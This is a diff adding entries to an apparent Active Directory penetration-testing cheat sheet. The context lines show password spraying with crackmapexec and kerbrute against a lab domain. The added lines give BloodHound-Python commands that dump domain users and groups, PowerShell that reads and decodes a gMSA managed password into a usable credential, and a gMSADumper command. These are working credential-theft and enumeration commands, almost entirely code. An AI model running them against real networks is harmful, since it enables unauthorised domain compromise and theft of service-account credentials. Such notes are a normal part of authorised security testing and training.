@@ -281,6 +281,16 @@ crackmapexec smb 10.10.13.100 -u users.txt -p $pass --users | tee userlist.txt
 /opt/kerbrute/dist/kerbrute_linux_amd64 passwordspray -d MEGACORP.CORP --dc 10.10.13.100 users.lst '$pass'
 ```
 
+**Dump Domain, Groups and Users using Bloodhound-Python:**
+```bash
+bloodhound-python -c all -u $user -p $password -d $domain -dc $dc_domain -ns $ip --disable-pooling -w1 --dns-timeout 30
+```
+Setting up Bloodhound:
+```bash
+sudo neo4j console
+sudo bloodhound
+```
+
 
 ## RID Cycling 
 
@@ -586,7 +596,18 @@ HKU\Software\Wow6432Node
 HKU\Software\Classes
 ```
 
+### Read GMSA Password
 
+```powershell
+$user = 'USER' 
+$gmsa = Get-ADServiceAccount -Identity $user -Properties 'msDS-ManagedPassword' 
+$blob = $gmsa.'msDS-ManagedPassword' 
+$mp = ConvertFrom-ADManagedPasswordBlob $blob 
+$cred = New-Object System.Management.Automation.PSCredential $user, $mp.SecureCurrentPassword
+````
+
+*gMSA dumping:*
+python3 gMSADumper.py -u $user -p $password -d $domain.local
 
 ## Hash Cracking
 
